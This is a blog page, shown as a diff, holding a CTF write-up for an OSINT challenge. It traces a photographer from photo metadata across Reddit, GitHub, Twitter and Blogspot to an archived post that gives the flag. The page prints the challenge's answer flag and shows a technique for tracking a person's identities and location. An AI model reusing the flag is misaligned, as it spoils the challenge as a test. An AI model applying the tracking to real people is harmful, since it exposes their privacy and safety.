+<p>Can you help us track down this photographer? 📸</p>
+<p>Author: therealbrenu</p>
+</blockquote>
+<hr>
+<p>The first photo is a simple lizard on a fence:</p>
+<p><img src="/p/1337up-ctf/Images/picture.jpg"
+	width="5184"
+	height="3456"
+	srcset="/p/1337up-ctf/Images/picture_hu17459129952803054511.jpg 480w, /p/1337up-ctf/Images/picture_hu680669865149384228.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="150"
+		data-flex-basis="360px"
+	
+></p>
+<p>The very first thing to check is image metadata via <code>exiftool</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">exiftool</span> <span class="n">picture</span><span class="o">.</span><span class="n">jpg</span>                                                  
+</span></span><span class="line"><span class="cl"><span class="n">ExifTool</span> <span class="n">Version</span> <span class="n">Number</span>         <span class="p">:</span> <span class="mf">12.65</span>    
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Modify</span> <span class="n">Date</span>                     <span class="p">:</span> <span class="mi">2023</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="mi">25</span> <span class="mi">23</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">32</span>  
+</span></span><span class="line"><span class="cl"><span class="n">Artist</span>                          <span class="p">:</span> <span class="n">fl0pfl0p5</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see the artist is named <code>fl0pfl0p5</code>. A quick google search for the name reveals an <code>about.me</code> page, and a reddit account. Delving further into reddit in particular, we can see another reddit page of interest:</p>
+<p><img src="/p/1337up-ctf/Images/redditsearch.png"
+	width="844"
+	height="578"
+	srcset="/p/1337up-ctf/Images/redditsearch_hu12160101660346986618.png 480w, /p/1337up-ctf/Images/redditsearch_hu11764394324734418788.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="146"
+		data-flex-basis="350px"
+	
+></p>
+<p>In the <a class="link" href="https://www.reddit.com/r/DailyCodingDose/comments/15l73xa/comment/k1d8b6v/"  target="_blank" rel="noopener"
+    >2nd post</a>, we see a different named user created a github page under the name <code>fl0pfl0p5</code>.</p>
+<p><img src="/p/1337up-ctf/Images/fl0pgithub.png"
+	width="844"
+	height="578"
+	srcset="/p/1337up-ctf/Images/fl0pgithub_hu8058557054469637109.png 480w, /p/1337up-ctf/Images/fl0pgithub_hu12996659614109641400.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="146"
+		data-flex-basis="350px"
+	
+></p>
+<p>The github page itself is not useful, but does have a cute dead end. A hello world script has a commit &ldquo;removed hardcoded secret&rdquo;:</p>
+<p><img src="/p/1337up-ctf/Images/secretcommit.png"
+	width="945"
+	height="472"
+	srcset="/p/1337up-ctf/Images/secretcommit_hu13355580549308438441.png 480w, /p/1337up-ctf/Images/secretcommit_hu18022686732596021554.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="480px"
+	
+></p>
+<p>The important information from the reddit post is we now have a different username connected, <code>m4r64r1n3</code>.  We can find that this person has a <a class="link" href="https://nitter.net/m4r64r1n3"  target="_blank" rel="noopener"
+    >twitter account</a> as well, and if you&rsquo;re paying careful attention you might also note that the account was created in September, the same time where all previous activity has been happening.</p>
+<p><img src="/p/1337up-ctf/Images/twitter1.png"
+	width="363"
+	height="507"
+	srcset="/p/1337up-ctf/Images/twitter1_hu17688052110981622899.png 480w, /p/1337up-ctf/Images/twitter1_hu12046948936138338503.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="71"
+		data-flex-basis="171px"
+	
+></p>
+<p>We can see that this person <a class="link" href="https://nitter.net/m4r64r1n3/status/1706488480753242352#m"  target="_blank" rel="noopener"
+    >posted a different picture</a> on the twitter account. Analyzing with <code>exiftool</code> does not give us more information, but when we image search via google, we can find it is associated with a new blog page, and a 3rd username. Note that in order to see this result, I had to select &ldquo;Find Image Source&rdquo; on the image results page.</p>
+<p><img src="/p/1337up-ctf/Images/exactmatches.png"
+	width="1069"
+	height="385"
+	srcset="/p/1337up-ctf/Images/exactmatches_hu7777128514249589777.png 480w, /p/1337up-ctf/Images/exactmatches_hu10735431310785465931.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="277"
+		data-flex-basis="666px"
+	
+></p>
+<p>When we visit the <a class="link" href="https://v1ck1pictures.blogspot.com/2023/09/just-little-bird.html"  target="_blank" rel="noopener"
+    >blog page</a>, we see an interesting anonymous comment: &ldquo;I don&rsquo;t think it&rsquo;s a good idea to share your location online.&rdquo; Wise words indeed.</p>
+<p><img src="/p/1337up-ctf/Images/anoncomment.png"
+	width="893"
+	height="772"
+	srcset="/p/1337up-ctf/Images/anoncomment_hu13799451448797382995.png 480w, /p/1337up-ctf/Images/anoncomment_hu4658930347838877701.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="115"
+		data-flex-basis="277px"
+	
+></p>
+<p>There is no location disclosure here anymore though, but perhaps it has been saved in the web archives. When we check the <a class="link" href="https://archive.org/web/"  target="_blank" rel="noopener"
+    >wayback machine</a>, we can see an archive conveniently placed on October 2, 1 day before this comment about sharing a location.</p>
+<p><img src="/p/1337up-ctf/Images/waybackmachine.png"
+	width="1206"
+	height="375"
+	srcset="/p/1337up-ctf/Images/waybackmachine_hu15490592858844966741.png 480w, /p/1337up-ctf/Images/waybackmachine_hu10835580206581209981.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="321"
+		data-flex-basis="771px"
+	
+></p>
+<p>When we <a class="link" href="https://web.archive.org/web/20231002010103/https://v1ck1pictures.blogspot.com/2023/09/just-little-bird.html"  target="_blank" rel="noopener"
+    >view the archive</a>, we see the flag!</p>
+<p><img src="/p/1337up-ctf/Images/wayback.png"
+	width="954"
+	height="521"
+	srcset="/p/1337up-ctf/Images/wayback_hu12232704319679834200.png 480w, /p/1337up-ctf/Images/wayback_hu5334788372078723140.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="183"
+		data-flex-basis="439px"
+	
+></p>
+<p><code>INTIGRITI{D3F1N173LY_N07_60TH4M_C17Y}</code></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/web/">Web</a>
+        
+            <a href="/tags/osint/">OSINT</a>
+        
+            <a href="/tags/flask/">Flask</a>
+        
+            <a href="/tags/nosql-injection/">NoSQL Injection</a>
+        
+            <a href="/tags/exiftool/">Exiftool</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/nahamconctf_2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NahamConCTF_2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/n00bzctf_2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">N00bzCTF_2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/huntress-ctf-2024/">
+        
+        
+            <div class="article-image">
+                <img src="/p/huntress-ctf-2024/HuntressCTF_Banner.6181f047aa18073aac2b72b3a0aa3ba2_hu2497031440356620825.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Huntress CTF 2024"
+                        
+                        data-hash="md5-YYHwR6oYBzqsK3KzoKo7og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Huntress CTF 2024</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-cyber-apocalypse-2024/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-cyber-apocalypse-2024/ca-2024-ctf-background.d1ff26ab7326bd1a79b6d1e0a52f6aa6_hu13886050347455417942.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Cyber Apocalypse: 2024"
+                        
+                        data-hash="md5-0f8mq3MmvRp5ttHgpS9qpg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Cyber Apocalypse: 2024</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/hack-the-boo-2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Hack The Boo 2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
